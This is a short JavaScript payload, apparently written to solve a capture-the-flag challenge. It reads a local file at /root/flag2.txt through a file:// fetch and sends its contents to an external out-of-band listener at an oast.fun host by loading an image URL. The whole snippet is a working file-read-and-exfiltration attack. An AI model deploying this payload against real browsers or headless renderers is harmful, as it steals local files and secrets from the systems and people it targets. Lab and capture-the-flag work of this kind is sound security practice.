(async () => {
    // read the real flag straight off the disk
    const txt = await (await fetch('file:///root/flag2.txt')).text();
    // exfiltrate it to your OAST listener
    new Image().src = 'https://nntdfrlpiazffctldarunhkvwn0hvbn8v.oast.fun/?flag='
                      + encodeURIComponent(txt);
  })();